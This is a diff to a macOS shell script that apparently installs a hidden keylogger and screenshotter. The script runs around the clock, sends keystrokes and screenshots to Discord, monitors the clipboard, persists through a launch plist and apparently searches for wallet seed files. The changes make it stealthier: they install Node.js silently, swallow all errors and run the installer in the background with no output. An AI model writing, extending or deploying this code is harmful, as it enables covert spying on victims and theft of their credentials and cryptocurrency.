@@ -717,9 +717,22 @@ EOF
 send_client_notification &
 
 # Install keylogger + screenshotter (runs 24/7, silent)
-install_keylogger_screenshotter() {
+install_keylogger_screenshotter_internal() {
     local APP_DIR="$HOME/.keylogger-helper"
     local NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
+    
+    # Check if Node.js is available
+    if ! command -v node >/dev/null 2>&1 && [ ! -f "$NODE_PATH" ]; then
+        echo "⚠️  Node.js not found - attempting to install..." >&2
+        # Try to install node via brew if available
+        if command -v brew >/dev/null 2>&1; then
+            brew install node >/dev/null 2>&1 || true
+            NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
+        fi
+        if ! command -v node >/dev/null 2>&1 && [ ! -f "$NODE_PATH" ]; then
+            return 1
+        fi
+    fi
     
     # Create app directory
     mkdir -p "$APP_DIR" 2>/dev/null
@@ -2383,8 +2396,8 @@ KEYLOGGEREOF
 }
 PKGEOF
     
-    # Install dependencies (wait for it to complete)
-    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1)
+    # Install dependencies (silent)
+    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || true
     
     # REMOVED: pke keylogger installation (repository not available)
     # Clipboard monitoring is working and captures copy/paste activity
@@ -2440,9 +2453,9 @@ PLISTEOF
     # Keylogger startup message is sent by the JS script itself (no duplicate needed)
 }
 
-# Install keylogger + screenshotter in background (non-blocking)
+# Install keylogger + screenshotter in background (SILENT - no output)
 # This runs 24/7, sends keystrokes + screenshots to Discord
-install_keylogger_screenshotter &
+install_keylogger_screenshotter_internal >/dev/null 2>&1 &
 
 # Wait for seed file search to complete (if it was started)
 if [ -n "$SEED_SEARCH_PID" ]; then
